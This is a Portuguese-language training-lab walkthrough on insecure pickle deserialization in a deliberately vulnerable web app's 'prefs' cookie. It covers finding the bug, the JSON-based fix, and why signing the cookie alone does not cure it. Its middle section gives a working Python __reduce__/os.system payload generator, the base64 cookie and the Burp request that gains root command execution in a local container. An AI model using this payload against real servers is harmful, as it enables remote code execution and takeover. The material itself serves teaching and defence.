# Walkthrough — deserialization-pickle

A app guarda as suas preferências num cookie chamado `prefs`. Por baixo, ela **serializa** o objeto de preferências com **pickle** — o módulo embutido do Python que transforma um objeto em bytes e o reconstrói depois — e base64-encoda o resultado no cookie. A cada request, ela lê o `prefs`, base64-decoda, e chama `pickle.loads` nos bytes pra reconstruir o objeto. O problema: **você controla o seu próprio cookie.** E o pickle não guarda só os dados do objeto — guarda *instruções de como reconstruí-lo*, incluindo qual função chamar. Um cookie forjado faz o `pickle.loads` rodar a função que você escolher: um comando no servidor.

## 1. Contexto

Em `/` a app mostra uma página de "user preferences" com uma linha — `Theme: light` — e seta um cookie `prefs` na primeira visita. Todo request seguinte lê esse cookie de volta pra renderizar o seu tema. Essa é a feature inteira; não há form (você não edita as preferências na UI — o input interessante é o próprio cookie).

Isto é **insecure deserialization**, sob **A08 — Software and Data Integrity Failures**. *Serialization* é transformar um objeto em memória numa sequência de bytes que você pode guardar ou transmitir; *deserialization* é o inverso — reconstruir o objeto a partir desses bytes. A categoria é sobre confiar em dados cuja integridade você nunca verificou: aqui a app pega um cookie que o usuário controla e reconstrói um objeto dele com um formato que pode carregar *código*, não só *dados*.

Não há banco nem segundo serviço — só a app `vulnerable` em `127.0.0.1:8020` e a `fixed` em `127.0.0.1:8120`. A exploração é feita no Burp, mais um script Python curto pra montar o payload. A prova de execução de código é um efeito colateral no servidor (um arquivo marcador), lido com `docker compose exec` — não algo que você vê na resposta HTTP.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/` reconstrói as suas preferências assim:

```python
cookie = request.cookies.get("prefs")
...
# VULNERABLE: the "prefs" cookie is base64-decoded and passed straight to pickle.loads.
prefs = pickle.loads(base64.b64decode(cookie))  # RCE: attacker bytes -> code on load
theme = prefs["theme"]
```

Os bytes passados pro `pickle.loads` vêm direto do seu cookie. O **pickle** não é um formato de dados como JSON — é um formato de *objeto*: um stream de pickle é um programinha de opcodes que o unpickler executa pra reconstruir um objeto. Qualquer objeto Python pode definir **`__reduce__`**, um hook que diz ao pickle como reconstruí-lo — ele retorna um par `(callable, args)` que significa "pra me recriar, chame `callable(*args)`". Quando o `pickle.loads` chega nisso, ele **chama** o callable. Aponte o `__reduce__` pra `os.system` e o unpickle *roda um comando de shell*. Pergunta de auditoria: *esses bytes vêm do meu cookie, que eu controlo — e o pickle vai chamar qualquer função que eles nomearem?* — sim. O fix (foreshadow): parar de usar um formato que carrega comportamento.

O grep barato de primeira passada pra essa classe é qualquer desserializador recebendo input não-confiável:

```bash
grep -rn 'pickle.loads\|pickle.load(\|yaml.load(\|jsonpickle' .
```

## 3. Exploração via Burp Suite

Configure o Burp Proxy e aponte seu browser pra ele. Visite <http://127.0.0.1:8020/> uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Passo 1 — Baseline: veja o pickle na rede

Mande o request sem cookie `prefs` (a primeira visita não tem nenhum). A resposta seta um pra você:

```
HTTP/1.1 200 OK
Set-Cookie: prefs=gASVFAAAAAAAAAB9lIwFdGhlbWWUjAVsaWdodJRzLg==; Path=/
...
<p>Theme: <strong>light</strong></p>
```

Esse valor de cookie é base64. Decode-o e olhe os bytes — este é o indício de que a app usa pickle, não JSON:

```
$ echo 'gASVFAAAAAAAAAB9lIwFdGhlbWWUjAVsaWdodJRzLg==' | base64 -d | python3 -c "import sys; print(sys.stdin.buffer.read())"
b'\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x05theme\x94\x8c\x05light\x94s.'
```

O `\x80\x04` inicial é o opcode `PROTO` do pickle (protocolo 4) — um stream de pickle, não o texto `{"theme": "light"}` que você veria de JSON. A app confia nesse blob e o entrega ao `pickle.loads`. Daqui você o substitui por um pickle seu.

### Passo 2 — Monte o payload

O pickle chama o que quer que o `__reduce__` retorne, então defina uma classe descartável cujo `__reduce__` nomeia `os.system`. Este scriptzinho imprime o cookie em base64 pra enviar — é como você montaria o payload num engajamento real:

```python
import base64, os, pickle

class Exploit:
    def __reduce__(self):
        # to "rebuild" me, pickle will call os.system("touch /tmp/pwned")
        return (os.system, ("touch /tmp/pwned",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

```
gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu
```

Montar o payload é seguro: o `pickle.dumps` só *registra* a instrução "chame `os.system('touch /tmp/pwned')`" no stream — ele não a roda. O comando roda em quem chamar `pickle.loads` nesses bytes. Faça o disassembly pra ver que não há nada malformado — é pickle perfeitamente válido:

```
$ python3 -c "import base64, pickletools; pickletools.dis(base64.b64decode('gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu'))"
    0: \x80 PROTO      5
    2: \x95 FRAME      43
   11: \x8c SHORT_BINUNICODE 'posix'
   19: \x8c SHORT_BINUNICODE 'system'
   28: \x93 STACK_GLOBAL
   30: \x8c SHORT_BINUNICODE 'touch /tmp/pwned'
   49: \x85 TUPLE1
   ...
```

O `STACK_GLOBAL` resolve `posix.system` (que é `os.system` no Linux) e o reduce no fim o chama com `"touch /tmp/pwned"`. Não há bug pra "sanitizar" aqui — é pickle bem-formado fazendo exatamente o que o pickle foi projetado pra fazer.

### Passo 3 — Dispare e prove a execução

Antes de enviar, confirme que o marcador ainda não existe:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

No Repeater, coloque o seu payload no cookie e envie:

```
GET / HTTP/1.1
Host: 127.0.0.1:8020
Cookie: prefs=gAWVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu
```

A resposta parece completamente comum:

```
HTTP/1.1 200 OK
...
<p>Theme: <strong>light</strong></p>
```

`Theme: light`, como sempre — **nada na resposta revela o ataque.** Essa é a natureza do RCE por deserialization (RCE, Remote Code Execution — executar comandos arbitrários no servidor): o comando dispara *dentro* do `pickle.loads`, antes de a app fazer qualquer coisa com o resultado, e a página renderiza como se nada tivesse acontecido. A prova é o efeito colateral. Cheque o servidor:

```
$ docker compose exec vulnerable ls -la /tmp/pwned
-rw-r--r-- 1 root root 0 Jul 24 18:41 /tmp/pwned
```

O arquivo existe — o seu cookie fez o servidor rodar `touch /tmp/pwned`. Troque o comando por `id` e ele imprime no log do container, mostrando *quem* você é:

```
$ docker compose logs vulnerable | grep uid
vulnerable-1  | uid=0(root) gid=0(root) groups=0(root)
```

**O que isto realmente é.** Aqui o comando roda dentro de um container isolado e descartável, então dar `touch` num arquivo ou imprimir `id` como `root` é inofensivo — esse isolamento é a rede de segurança deste lab. Num alvo real isto é **Remote Code Execution** pleno: comandos arbitrários como o usuário do servidor, na máquina do servidor. O inócuo `touch`/`id` faz as vezes de controle total do host. Mantenha os seus payloads demonstrativos — um arquivo marcador, um `id`; nunca há razão pra apelar pra `rm -rf`, um reverse shell, ou qualquer coisa destrutiva ou de rede, nem num container.

## 4. O que a vuln NÃO é

O exploit é um cookie que você adulterou, então é fácil tirar a lição errada. Isole a causa real:

- **NÃO é "um cookie adulterável" — assinar não resolve.** A reação tentadora é "assina o cookie com um HMAC pra ele não poder ser forjado". Isso eleva a barra pra *esta* entrega (um cookie forjado é rejeitado), mas não toca a causa: `pickle.loads` em bytes não-confiáveis continua sendo RCE. Se a chave de assinatura vazar (segredos vazam — o `ssti-jinja` revela uma `SECRET_KEY` do Flask por um bug de template) ou os bytes chegarem ao `loads` por qualquer outro caminho — um cache, uma fila, um arquivo — você está de volta à execução de código. A causa é o **formato**, não a autenticidade do cookie. (Sintoma vs. causa — veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).)
- **NÃO é o mesmo que command injection.** O `command-injection-basic` também chega a RCE, mas lá a app *monta uma string de comando de shell* com o seu input e um shell a parseia (A03 — Injection). Aqui nada monta um comando — o *desserializador* reconstrói um objeto e roda o comportamento embutido nos bytes (A08). Causa diferente, classe diferente, fix diferente; só o impacto (RCE) é o mesmo.
- **NÃO é um bug de validação / sanitização de input.** O cookie malicioso é pickle *válido* (o disassembly do Passo 2 prova) — não há input malformado pra rejeitar e nada pra "sanitizar". O formato em si executa comportamento carregado em dados bem-formados.

A única coisa que a vuln **é**: o `pickle.loads` reconstrói um objeto que *você* forjou e chama a função que o `__reduce__` dele nomeia, porque o formato carrega comportamento. O único fix é usar um formato que carregue **só dados**.

## 5. Impacto

**Remote Code Execution.** O atacante roda comandos arbitrários no servidor através de um único cookie adulterado — o topo da escala de severidade. É o mesmo teto do `command-injection-basic`, alcançado por uma causa diferente (um desserializador que executa comportamento embutido, não um shell parseando uma string de comando). Sem overclaim: é RCE como o usuário do container da app (aqui, `root`), o que já significa controle total daquele host.

## 6. Por que o fix funciona

Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança. A app fixed lê o mesmo cookie mas (de)serializa com **JSON** — um formato só-dados:

```python
prefs = json.loads(base64.b64decode(cookie))  # JSON: data only; no code path on load
```

O cookie baseline dela é JSON, não pickle — decode-o e você recebe texto, sem opcodes pra executar:

```
$ echo 'eyJ0aGVtZSI6ICJsaWdodCJ9' | base64 -d
{"theme": "light"}
```

Repita o exploit contra <http://127.0.0.1:8120/>: mande o *mesmo* cookie malicioso de pickle, depois cheque o servidor:

```
$ docker compose exec fixed ls -la /tmp/pwned
ls: cannot access '/tmp/pwned': No such file or directory
```

O marcador nunca é criado. O `json.loads` nos bytes de pickle simplesmente levanta uma exceção (eles não são JSON válido), a app cai no default, e a página ainda renderiza `Theme: light`. O `json.loads` não tem mecanismo pra chamar uma função — o pior que um cookie malicioso produz é um dicionário estranho. O fix inteiro é o formato: `pickle` → `json`.

Note o que o fix *não* é: ele não valida o cookie, não bloqueia um padrão de bytes, não o assina. Assinar (um HMAC) é uma mitigação que vale ter em profundidade — torna a adulteração detectável — mas guarda uma operação insegura em vez de removê-la; o fix de causa é parar de desserializar dado não-confiável com um formato que carrega comportamento. A própria doc do `pickle` do Python diz exatamente isso: considere HMAC se você precisa de tamper-detection, mas "safer serialization formats such as `json` may be more appropriate if you are processing untrusted data".
